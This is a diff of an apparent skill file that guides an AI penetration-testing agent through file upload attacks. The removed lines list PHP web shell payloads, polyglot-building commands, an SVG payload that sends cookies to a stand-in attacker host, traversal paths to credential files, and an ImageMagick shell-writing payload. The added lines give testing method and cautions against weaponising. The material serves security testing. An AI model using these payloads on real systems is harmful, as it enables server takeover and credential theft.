@@ -1,4 +1,4 @@
----
+﻿---
 name: file-upload-attacks
 description: "File upload exploitation including double extension, polyglot files, SVG XSS, and restricted file bypass"
 category: specialized
@@ -23,132 +23,22 @@ owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
 Before making HTTP requests, call **getCapturedHeaders** with the target URL to get real auth context. Pass these in the `headers` parameter of httpRequest.
 
 ## Upload Field Discovery
-```
-POST /api/upload
-POST /api/files/upload
-POST /api/attachments
-POST /api/import
-POST /upload
-POST /admin/upload
-POST /api/user/avatar
-POST /api/documents
-
-# HTML upload forms
-<input type="file" name="file">
-<input type="file" name="attachment" accept=".jpg,.png" hidden>
-```
 
 ## Double Extension Bypass
-```
-shell.php.jpg
-shell.php.png
-shell.phtml.jpg
-
-# Null byte injection
-shell.php%00.jpg
-
-# Semicolon injection (IIS)
-shell.php;.jpg
-
-# Case variation
-shell.pHp
-shell.pHP
-```
 
 ## Content-Type Bypass
-```
-# Change MIME type to allowed type
-Content-Type: image/jpeg
-Content-Type: image/png
-Content-Type: image/gif
-
-# Null byte in Content-Type
-Content-Type: image/jpeg%00
-```
 
 ## Magic Bytes Bypass
-```
-# GIF89a header
-GIF89a<?php echo shell_exec($_GET['cmd']); ?>
-
-# JPEG header
-FF D8 FF E0<?php echo shell_exec($_GET['cmd']); ?>
-
-# PNG header
-89 50 4E 47 0D 0A 1A 0A<?php echo shell_exec($_GET['cmd']); ?>
-```
 
 ## Polyglot Files
-```
-# JPEG + PHP polyglot using EXIF data
-exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' image.jpg
-# Rename to image.php.jpg
-
-# PNG + PHP polyglot
-python -c "import sys; sys.stdout.buffer.write(open('image.png','rb').read() + b'<?php echo shell_exec($_GET[\"cmd\"]); ?>')" > shell.php.png
-```
 
 ## SVG XSS Upload
-```xml
-<!-- Basic SVG XSS -->
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-
-<!-- SVG with external resource -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image href="https://YOUR-OAST/steal?cookie=" />
-</svg>
-
-<!-- SVG with foreignObject -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <foreignObject width="200" height="200">
-    <body xmlns="http://www.w3.org/1999/xhtml">
-      <script>alert(1)</script>
-    </body>
-  </foreignObject>
-</svg>
-```
 
 ## Path Traversal in Filename
-```
-../../../etc/cron.d/shell
-..%2f..%2f..%2fetc%2fpasswd
-
-# Windows path traversal
-..\..\..\windows\system32\config\sam
-
-# Double URL encoding
-..%252f..%252f..%252fetc/passwd
-
-# Null byte
-../../../etc/passwd%00.jpg
-```
 
 ## ImageMagick Exploitation (CVE-2016-3714)
-```
-# Delegate attack via crafted image
-<image>
-  <delegate>%s</delegate>
-  <input>config</input>
-</image>
-
-# MSL bypass
-<image>
-  <read filename="ephemeral:/tmp/test.php" />
-  <write filename="/var/www/html/shell.php" />
-</image>
-```
 
 ## Race Condition on Upload
-```
-# Upload and access before deletion
-# Step 1: Upload file via POST
-# Step 2: Immediately access the uploaded file (before async validation deletes it)
-# Step 3: If timing is right, execute before deletion
-
-# Concurrent uploads
-# Send multiple upload requests simultaneously
-# Some may bypass validation due to race condition
-```
 
 ## Evidence Collection
 - Upload request/response pairs
@@ -161,3 +51,24 @@ python -c "import sys; sys.stdout.buffer.write(open('image.png','rb').read() + b
 Your claims will be verified against real tool output. Never fabricate findings.
 Every upload bypass you report MUST have a corresponding tool call response that proves it.
 If a tool call fails, say so honestly — do not invent a success.
+
+## Trigger Conditions
+
+Activate on any file upload/import feature: avatars, documents, media, archives, certificates, plugins/themes, or profile imports. Trigger especially for SVG uploads (XSS), server-side processing (ImageMagick/GD/librsvg), and endpoints that later serve uploaded files. Also relevant when filenames/paths are user-controlled (path traversal) or the app processes the file server-side. Do not trigger to deploy actual malware — prove the flaw, don't weaponize. Avoid destructive payloads on production.
+
+## Detection Approach
+
+First discover the upload field and the validation model: inspect accepted extensions, `Content-Type`, magic bytes, size, and the response (stored path, processed output). Reason about the weakest link. Test filename-based bypasses (double extension `shell.php.jpg`, trailing dot/null byte, path traversal `../../`), then `Content-Type` spoofing, then magic-byte padding ahead of a polyglot payload (script embedded after a valid GIF/JPEG header). For SVG, inject XML/script and verify server-side or client-side rendering. For processing libraries, probe known unsafe primitives (ImageMagick `</>` delegates). Confirm success by actually retrieving/executing the uploaded artifact (XSS alert, command output, or saved file at a predictable path) — not by a generic "upload succeeded" message. Mind the race condition on async AV scanners that delete bad files after a delay.
+
+## Pitfalls
+
+- Treating "upload succeeded" as proof of execution — you must retrieve/execute the file to confirm impact.
+- Assuming client-side extension checks are the only control — verify server-side validation too.
+- Overlooking content-type vs magic-byte mismatches — set both consistently for the spoof.
+- Forgetting processing libraries (ImageMagick) can be the real sink, not just the web server.
+- Ignoring the async-scanner race — a file may vanish after upload, defeating the test.
+- Weaponizing with real malware on production — keep PoCs benign proof-of-concept files.
+
+## Verification & Impact
+
+CONFIRMED when the uploaded file is stored/served and demonstrably executes or renders with attacker control: script/XSS from an SVG, command output from a server-side processed polyglot, or a file written outside the intended directory via traversal. SUSPECTED when the upload is accepted but execution/retrieval isn't proven — record as candidate. Document impact by capability (arbitrary file write, XSS, RCE via processing library, traversal) and severity. Capture the upload request, stored-path discovery, and execution/retrieval proof via `recordEvidence`.
